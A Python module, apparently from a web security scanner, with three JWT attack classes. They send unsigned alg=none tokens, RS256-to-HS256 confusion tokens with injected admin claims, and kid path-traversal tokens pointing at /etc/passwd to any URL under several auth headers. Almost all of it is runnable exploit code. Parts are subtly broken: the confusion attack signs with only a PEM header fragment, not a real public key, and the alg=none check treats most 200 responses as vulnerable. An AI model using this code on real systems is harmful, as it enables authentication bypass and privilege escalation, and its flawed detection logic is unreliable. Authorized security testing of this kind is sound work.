"""Attack classes for JWT security testing: None algorithm, Algorithm confusion, and Key ID traversal."""

import base64
import hashlib
import hmac
import json
import logging
from typing import Any

logger = logging.getLogger(__name__)


def b64url_encode(data: bytes) -> str:
    """Base64url encode data without padding."""
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def b64url_decode(s: str) -> bytes:
    """Base64url decode data with padding restoration."""
    s = s + "=" * (4 - len(s) % 4)
    return base64.urlsafe_b64decode(s)


def decode_jwt_part(part: str) -> dict | Any | None:
    """Decode a single JWT part (header or payload)."""
    try:
        decoded = b64url_decode(part)
        return json.loads(decoded)
    except Exception:
        return None


def create_jwt(header: dict, payload: dict, secret: bytes = b"secret") -> str:
    """Create a JWT token with HMAC-SHA256 signature."""
    header_b64 = b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    payload_b64 = b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    signing_input = f"{header_b64}.{payload_b64}".encode()
    signature = hmac.new(secret, signing_input, hashlib.sha256).digest()
    sig_b64 = b64url_encode(signature)
    return f"{header_b64}.{payload_b64}.{sig_b64}"


JWT_AUTH_HEADERS = [
    "Authorization",
    "X-Access-Token",
    "X-Auth-Token",
    "X-JWT-Token",
    "X-Api-Token",
]


class NoneAlgorithmAttack:
    """Tests alg=none signature bypass.

    Modifies the JWT header to use alg=none and removes the signature,
    testing if the server accepts unsigned tokens.
    """

    def __init__(self, token: str):
        self.token = token
        self.attack_name = "alg_none_bypass"

    def execute(self, url: str, session: Any) -> dict[str, Any]:
        """Execute the alg=none attack."""
        result: dict[str, Any] = {"attack": self.attack_name, "vulnerable": False, "details": []}
        try:
            parts = self.token.split(".")
            if len(parts) != 3:
                return result
            payload = decode_jwt_part(parts[1])
            if not payload:
                return result

            header = {"alg": "none", "typ": "JWT"}
            header_b64 = b64url_encode(json.dumps(header, separators=(",", ":")).encode())
            payload_b64 = b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
            none_token = f"{header_b64}.{payload_b64}."

            try:
                orig = session.get(url, timeout=8, verify=True)
                original_status = orig.status_code
            except Exception:
                original_status = 0

            for auth_header in JWT_AUTH_HEADERS:
                resp = session.request(
                    "GET",
                    url,
                    headers={auth_header: f"Bearer {none_token}"},
                    timeout=10,
                    verify=True,
                )
                status = resp.status_code
                body = resp.text.lower()

                if status in (200, 302) and original_status in (401, 403):
                    result["vulnerable"] = True
                    result["details"].append(
                        {
                            "auth_header": auth_header,
                            "status_code": status,
                            "original_status": original_status,
                            "finding": "alg_none_bypass_auth_bypass",
                        }
                    )
                    break
                elif status == 200 and "error" not in body and "invalid" not in body:
                    result["vulnerable"] = True
                    result["details"].append(
                        {
                            "auth_header": auth_header,
                            "status_code": status,
                            "finding": "alg_none_accepted",
                        }
                    )
                    break

            logger.info("alg=none test on %s: vulnerable=%s", url, result["vulnerable"])
        except Exception as e:
            logger.error("alg=none test error on %s: %s", url, e)
        return result


class AlgorithmConfusionAttack:
    """Tests RS256-to-HS256 algorithm confusion.

    Re-signs an RS256 token with HS256 using the public key as the symmetric secret,
    testing if the server uses the public key for HMAC verification.
    """

    def __init__(self, token: str):
        self.token = token
        self.attack_name = "algorithm_confusion"

    def execute(self, url: str, session: Any) -> dict[str, Any]:
        """Execute the algorithm confusion attack."""
        result: dict[str, Any] = {"attack": self.attack_name, "vulnerable": False, "details": []}
        try:
            parts = self.token.split(".")
            if len(parts) != 3:
                return result
            header = decode_jwt_part(parts[0])
            payload = decode_jwt_part(parts[1])
            if not header or not payload:
                return result

            if not isinstance(header, dict) or header.get("alg") != "RS256":
                result["skipped"] = True
                result["reason"] = "Token does not use RS256"
                return result

            modified_payload = dict(payload)
            modified_payload["admin"] = True
            modified_payload["role"] = "admin"
            modified_payload["is_admin"] = True

            confusion_token = create_jwt(
                {"alg": "HS256", "typ": "JWT"},
                modified_payload,
                secret=b"-----BEGIN PUBLIC KEY-----\n",
            )

            try:
                orig = session.get(url, timeout=8, verify=True)
                original_status = orig.status_code
            except Exception:
                original_status = 0

            for auth_header in JWT_AUTH_HEADERS:
                resp = session.request(
                    "GET",
                    url,
                    headers={auth_header: f"Bearer {confusion_token}"},
                    timeout=10,
                    verify=True,
                )
                status = resp.status_code

                if status in (200, 302) and original_status in (401, 403):
                    result["vulnerable"] = True
                    result["details"].append(
                        {
                            "auth_header": auth_header,
                            "status_code": status,
                            "original_status": original_status,
                            "finding": "alg_confusion_rs256_to_hs256_bypass",
                        }
                    )
                    break

            logger.info("Algorithm confusion test on %s: vulnerable=%s", url, result["vulnerable"])
        except Exception as e:
            logger.error("Algorithm confusion test error on %s: %s", url, e)
        return result


class KidPathTraversalAttack:
    """Tests kid (Key ID) header injection for path traversal.

    Modifies the kid header to point to file system paths like /etc/passwd,
    testing if the server reads arbitrary files for key material.
    """

    def __init__(self, token: str):
        self.token = token
        self.attack_name = "kid_path_traversal"

    def execute(self, url: str, session: Any) -> dict[str, Any]:
        """Execute the kid path traversal attack."""
        result: dict[str, Any] = {"attack": self.attack_name, "vulnerable": False, "details": []}
        try:
            parts = self.token.split(".")
            if len(parts) != 3:
                return result
            header = decode_jwt_part(parts[0])
            payload = decode_jwt_part(parts[1])
            if not header or not payload:
                return result

            if not isinstance(header, dict):
                header = {"alg": "HS256", "typ": "JWT"}

            traversal_paths = [
                "../../../../../../etc/passwd",
                "../../../../../../dev/null",
                "/dev/null",
            ]

            try:
                orig = session.get(url, timeout=8, verify=True)
                original_status = orig.status_code
            except Exception:
                original_status = 0

            for kid_path in traversal_paths:
                kid_header = dict(header)
                kid_header["kid"] = kid_path
                kid_header["alg"] = "HS256"
                kid_token = create_jwt(kid_header, payload)

                for auth_header in JWT_AUTH_HEADERS:
                    resp = session.request(
                        "GET",
                        url,
                        headers={auth_header: f"Bearer {kid_token}"},
                        timeout=10,
                        verify=True,
                    )
                    status = resp.status_code
                    body = resp.text

                    if status in (200, 500) and original_status in (401, 403):
                        result["vulnerable"] = True
                        result["details"].append(
                            {
                                "kid_path": kid_path,
                                "auth_header": auth_header,
                                "status_code": status,
                                "original_status": original_status,
                                "finding": "kid_traversal_auth_bypass",
                            }
                        )
                        break

                    if status == 500 and "passwd" in body.lower():
                        result["vulnerable"] = True
                        result["details"].append(
                            {
                                "kid_path": kid_path,
                                "auth_header": auth_header,
                                "status_code": status,
                                "finding": "kid_traversal_file_content_leak",
                            }
                        )
                        break

                if result["vulnerable"]:
                    break

            logger.info("KID traversal test on %s: vulnerable=%s", url, result["vulnerable"])
        except Exception as e:
            logger.error("KID traversal test error on %s: %s", url, e)
        return result
